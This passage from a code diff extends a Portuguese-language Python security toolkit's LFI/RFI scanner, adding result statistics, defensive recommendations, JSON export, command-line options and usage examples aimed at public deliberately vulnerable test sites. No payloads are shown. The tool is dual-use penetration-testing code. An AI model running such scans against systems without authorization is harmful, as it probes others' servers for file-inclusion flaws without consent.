+            stats_table.add_row("Médio", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Médio'])))
+            stats_table.add_row("Baixo", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Baixo'])))
+            
+            console.print(stats_table)
+            
+            # Recomendações gerais
+            console.print("\n[bold blue]Recomendações de Segurança:[/bold blue]")
+            console.print("• Implementar validação rigorosa de entrada")
+            console.print("• Usar whitelist de arquivos permitidos")
+            console.print("• Implementar path canonicalization")
+            console.print("• Configurar chroot/jail para o servidor web")
+            console.print("• Desabilitar funções perigosas do PHP (allow_url_include, allow_url_fopen)")
+            console.print("• Implementar Content Security Policy (CSP)")
+            console.print("• Monitorar logs de acesso para padrões suspeitos")
+            console.print("• Atualizar regularmente o sistema e aplicações")
+            
+        console.print("-" * 80)
 
-def lfi_scan(url):
-    LFIScanner(url).run_scan()
+    def export_findings(self, filename='lfi_scan_results.json'):
+        """Exporta os resultados para um arquivo JSON"""
+        if not self.vulnerable_points:
+            console.print("[yellow]Nenhuma vulnerabilidade encontrada para exportar.[/yellow]")
+            return
+            
+        export_data = {
+            'scan_info': {
+                'target': self.base_url,
+                'timestamp': datetime.now().isoformat(),
+                'total_vulnerabilities': len(self.vulnerable_points),
+                'scanner_version': '2.0',
+                'timeout': self.timeout,
+                'threads': self.threads
+            },
+            'vulnerabilities': self.vulnerable_points,
+            'statistics': {
+                'critical': len([f for f in self.vulnerable_points if f['Risco'] == 'Crítico']),
+                'high': len([f for f in self.vulnerable_points if f['Risco'] == 'Alto']),
+                'medium': len([f for f in self.vulnerable_points if f['Risco'] == 'Médio']),
+                'low': len([f for f in self.vulnerable_points if f['Risco'] == 'Baixo']),
+                'lfi_count': len([f for f in self.vulnerable_points if 'LFI' in f['Tipo']]),
+                'rfi_count': len([f for f in self.vulnerable_points if 'RFI' in f['Tipo']])
+            }
+        }
+        
+        try:
+            with open(filename, 'w', encoding='utf-8') as f:
+                json.dump(export_data, f, indent=2, ensure_ascii=False)
+            console.print(f"[green]Resultados exportados para: {filename}[/green]")
+        except Exception as e:
+            console.print(f"[red]Erro ao exportar resultados: {e}[/red]")
+
+def lfi_scan(url, timeout=10, threads=5, export_results=False, verbose=False):
+    """Função principal para executar scan de LFI/RFI"""
+    scanner = LFIScanner(url, timeout=timeout, threads=threads)
+    scanner.verbose = verbose
+    return scanner.run_scan(export_results=export_results)
 
 # --- MÓDULO 18: SCANNER DE SSRF (SERVER-SIDE REQUEST FORGERY) ---
 
@@ -9582,6 +10174,18 @@ Exemplos de Uso:
   # Scan XSS avançado com modo verbose para análise detalhada
   python %(prog)s xss-scan -u "http://xss-game.appspot.com/level1/frame" --verbose --scan-stored
 
+  # Scanner LFI/RFI avançado com detecção de bypass e múltiplas técnicas
+  python %(prog)s lfi-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
+  
+  # Scanner LFI com timeout personalizado e exportação de resultados
+  python %(prog)s lfi-scan -u "https://demo.testfire.net/bank/queryxpath.aspx" --timeout 15 --export
+  
+  # Scanner LFI com múltiplas threads para melhor performance
+  python %(prog)s lfi-scan -u "https://portswigger-labs.net/lfi_lab" --threads 10 --timeout 20
+  
+  # Scanner LFI com modo verbose para análise detalhada das técnicas
+  python %(prog)s lfi-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --verbose --export
+
   # Procura por CVEs para OpenSSL, ignorando o cache e filtrando por CVSS
   python %(prog)s cve-scan --product openssl --version 1.0.2 --min-cvss 7.0 --no-cache
 
@@ -9702,8 +10306,12 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     parser_cmd = subparsers.add_parser('cmd-scan', help='[Scan] Procura por falhas de Injeção de Comandos.')
     parser_cmd.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
     
-    parser_lfi = subparsers.add_parser('lfi-scan', help='[Scan] Procura por falhas de Local File Inclusion (LFI).')
+    parser_lfi = subparsers.add_parser('lfi-scan', help='[Scan] Scanner avançado de LFI/RFI com 86+ payloads e múltiplas técnicas de bypass.')
     parser_lfi.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
+    parser_lfi.add_argument('-t', '--timeout', type=int, default=10, help='Timeout para requisições em segundos (padrão: 10)')
+    parser_lfi.add_argument('--threads', type=int, default=5, help='Número de threads para processamento (padrão: 5)')
+    parser_lfi.add_argument('--export', action='store_true', help='Exportar resultados para arquivo JSON')
+    parser_lfi.add_argument('--verbose', action='store_true', help='Exibe informações detalhadas sobre técnicas de bypass, detecções e progresso do scan.')
 
     parser_ssrf = subparsers.add_parser('ssrf-scan', help='[Scan] Procura por falhas de Server-Side Request Forgery (SSRF).')
     parser_ssrf.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
@@ -9896,7 +10504,7 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     elif args.tool == 'cmd-scan':
         command_injection_scan(args.url)
     elif args.tool == 'lfi-scan':
-        lfi_scan(args.url)
+        lfi_scan(args.url, timeout=args.timeout, threads=args.threads, export_results=args.export, verbose=args.verbose)
     elif args.tool == 'ssrf-scan':
         ssrf_scan(args.url)
     elif args.tool == 'open-redirect-scan':
